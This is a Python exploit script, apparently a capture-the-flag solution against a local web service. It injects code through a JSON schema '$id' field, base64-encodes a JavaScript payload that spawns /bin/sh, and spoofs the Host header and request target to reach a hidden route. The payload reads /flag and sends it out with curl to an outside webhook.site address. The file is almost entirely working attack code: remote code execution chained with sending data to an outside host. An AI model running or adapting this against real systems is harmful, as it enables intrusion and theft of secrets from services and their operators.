import base64
import json
import subprocess

TARGET_URL = "http://localhost:8787/"


payload = "w={type:'pipe',readable:1,writable:1};console.log(process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','cat /flag|curl -d@- https://webhook.site/52ca08ee-4c38-4083-b687-c3082e02c48e'],stdio:[w,w]}).output.toString())"

payload = base64.b64encode(payload.encode()).decode()
body = {"$id": f'"+eval(atob("{payload}"))+"', "if": True, "then": True}


r = subprocess.check_output(
    [
        "curl",
        TARGET_URL,
        "-XPOST",
        "--request-target",
        "http://x.saas/register",
        "-H",
        "Host: easy++++++",
        "-H",
        "Content-Type: application/json",
        "-d",
        json.dumps(body),
    ]
)

r = subprocess.check_output(
    [
        "curl",
        TARGET_URL,
        "--request-target",
        "http://x.saas" + json.loads(r)["route"],
        "-H",
        "Host: easy++++++",
    ]
)

print(json.loads(r))
